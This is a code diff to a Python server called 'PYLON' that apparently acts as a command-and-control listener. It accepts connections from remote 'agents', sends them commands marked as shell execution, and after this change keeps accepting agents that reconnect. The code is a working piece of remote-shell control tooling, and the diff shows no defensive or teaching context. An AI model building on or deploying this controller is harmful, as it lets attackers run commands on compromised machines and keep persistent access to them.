@@ -13,16 +13,10 @@ def receive_exact(conn, size):
         buffer += chunk
     return buffer
 
-def main():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    server.bind((HOST, PORT))
-    server.listen(1)
-    print(f"Listening for {HOST}:{PORT}")
-    
-    conn, addr = server.accept()
-    print(f"Agent connection: {addr}")
+def handle_agent(conn, addr):
+    print(f"Connection: {addr}")
+    print("Exit - close program")
+    print("drop - disconnect agent, allow he to reconnect")
     
     print("==== PYLON ====")
     
@@ -38,7 +32,10 @@ def main():
                 conn.sendall(header)
                 print("Closing session")
                 break
-            
+                
+            if cmd == 'drop':
+                print('Disconnecting agent')
+                break
 
             payload = cmd.encode()
             header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
@@ -63,7 +60,24 @@ def main():
         print(f"Error: {e}")
     finally:
         conn.close()
-        server.close()
+
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    server.bind((HOST, PORT))
+    server.listen(1)
+    print(f"Listening for {HOST}:{PORT}")
+    
+    try:
+        while True:
+            conn, addr = server.accept()
+            handle_agent(conn, addr)
+    except KeyboardInterrupt:
+        print('Closing')
+    finally:
+        server.close()    
     
 if __name__ == "__main__":
     main()
